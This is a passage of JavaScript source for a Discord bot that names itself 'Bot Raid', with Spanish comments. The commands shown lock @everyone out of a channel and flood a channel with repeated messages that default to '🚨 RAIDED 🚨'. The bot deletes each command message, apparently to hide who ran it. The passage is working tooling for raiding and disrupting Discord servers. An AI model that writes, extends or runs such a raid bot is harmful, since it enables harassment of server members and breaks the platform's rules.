      const channel = message.mentions.channels.first() || message.channel;
      if (!channel) {
        return message.reply({ embeds: [EMBEDS.error('Canal no encontrado')] }).catch(() => {});
      }
      await channel.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
      database.addCommand('mutechannel', message.author.id, guild.id);
      logger.success(`Canal silenciado: ${channel.name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Canal #${channel.name} silenciado`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando mutechannel', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error silenciando canal')] }).catch(() => {});
    }
  },

  async unmutechannel(message, guild, client, args) {
    try {
      const channel = message.mentions.channels.first() || message.channel;
      if (!channel) {
        return message.reply({ embeds: [EMBEDS.error('Canal no encontrado')] }).catch(() => {});
      }
      await channel.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: true });
      database.addCommand('unmutechannel', message.author.id, guild.id);
      logger.success(`Canal desilenciado: ${channel.name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Canal #${channel.name} desilenciado`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando unmutechannel', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error desilenciando canal')] }).catch(() => {});
    }
  },

  async spam(message, guild, client, args) {
    try {
      const count = parseInt(args[0]) || 5;
      const text = args.slice(1).join(' ') || '🚨 RAIDED 🚨';
      const channel = message.channel;

      for (let i = 0; i < count; i++) {
        await channel.send({ content: text });
        await BotUtils.sleep(100);
      }

      database.addCommand('spam', message.author.id, guild.id);
      logger.success(`Spam completado: ${count} mensajes`);
    } catch (err) {
      logger.error('Error en comando spam', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error en spam')] }).catch(() => {});
    }
  },

  formatUptime(uptime) {
    if (!uptime) return 'N/A';
    const days = Math.floor(uptime / 86400000);
    const hours = Math.floor((uptime % 86400000) / 3600000);
    const minutes = Math.floor((uptime % 3600000) / 60000);
    const seconds = Math.floor((uptime % 60000) / 1000);
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
  }
};

// ==================== CARGAR BUFFERS ====================

const BUFFERS = {
  icon: BotUtils.loadBuffer(CONFIG.ICON_FILE),
  triangulito: BotUtils.loadBuffer(CONFIG.TRIANGULITO_FILE)
};

logger.info('Buffers cargados', { 
  icon: BUFFERS.icon ? 'Cargado' : 'No encontrado',
  triangulito: BUFFERS.triangulito ? 'Cargado' : 'No encontrado'
});

// ==================== CLIENTE DISCORD ====================

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: ['MESSAGE', 'CHANNEL', 'REACTION']
});

// ==================== EVENTOS ====================

client.on('ready', () => {
  logger.success(`Bot conectado como: ${client.user.tag}`);
  const perms = 1342385206n;
  logger.info(`Link de invitación: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=${perms}&scope=bot`);
  
  client.user.setStatus('online');
  client.user.setActivity('Bot Raid v' + CONFIG.VERSION, { type: 'Watching' });
  
  logger.info('Estadísticas del bot', {
    servidores: client.guilds.cache.size,
    usuarios: client.users.cache.size,
    canales: client.channels.cache.size
  });
});

client.on('messageCreate', async message => {
  try {
    if (!message.content.startsWith(CONFIG.PREFIX) || message.author.bot) return;

    // Verificar rate limit
    const rateLimitCheck = rateLimiter.check(message.author.id);
    if (!rateLimitCheck.allowed) {
      logger.warn('Rate limit excedido', { userId: message.author.id, resetIn: rateLimitCheck.resetIn });
      return message.reply({ embeds: [EMBEDS.warning(`⏱️ Debes esperar ${Math.ceil(rateLimitCheck.resetIn / 1000)}s`)] }).catch(() => {});
    }

    // Borrar comando
    message.delete().catch(() => {});

    const { guild, member } = message;
    const parts = message.content.slice(1).split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);

    if (!guild) {
      return message.channel.send({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] }).catch(() => {});
    }

    if (COMMANDS[cmd]) {
      logger.info(`Ejecutando comando: .${cmd}`, { userId: message.author.id, guildId: guild.id });
      
      try {
        await COMMANDS[cmd](message, guild, client, args, member);
      } catch (err) {
        logger.error(`Error ejecutando comando ${cmd}`, { error: err.message, userId: message.author.id });
        message.reply({ embeds: [EMBEDS.error(`Error ejecutando comando: ${err.message}`)] }).catch(() => {});
      }
    } else {
      logger.debug(`Comando desconocido: .${cmd}`);
    }
  } catch (err) {
    logger.error('Error procesando comando', { error: err.message });
  }
});

client.on('guildCreate', guild => {
  logger.info('Bot añadido a nuevo servidor', { guildId: guild.id, guildName: guild.name });
  database.updateGuildStats(guild.id, { joinedAt: new Date().toISOString() });
});

client.on('guildDelete', guild => {
  logger.info('Bot removido de servidor', { guildId: guild.id, guildName: guild.name });
});

client.on('error', err => {
  logger.error('Error del cliente Discord', { error: err.message });
});

client.on('warn', info => {
  logger.warn('Advertencia del cliente Discord', { warning: info });
});

// ==================== GESTIÓN DE PROCESOS ====================

process.on('unhandledRejection', err => {
  logger.error('Promise rechazada sin manejar', { error: err.message, stack: err.stack });
});

process.on('uncaughtException', err => {
  logger.error('Excepción no capturada', { error: err.message, stack: err.stack });
  process.exit(1);
});

// ==================== LOGIN ====================

if (!CONFIG.DISCORD_TOKEN) {
  logger.error('DISCORD_TOKEN no está configurado en .env');
  process.exit(1);
}

logger.info('Iniciando bot...', { version: CONFIG.VERSION, debug: CONFIG.DEBUG_MODE });

client.login(CONFIG.DISCORD_TOKEN).catch(err => {
  logger.error('Error al conectar a Discord', { error: err.message });
  process.exit(1);
});

// ==================== EXPORTAR ====================

module.exports = { client, logger, database, cache, BotUtils };
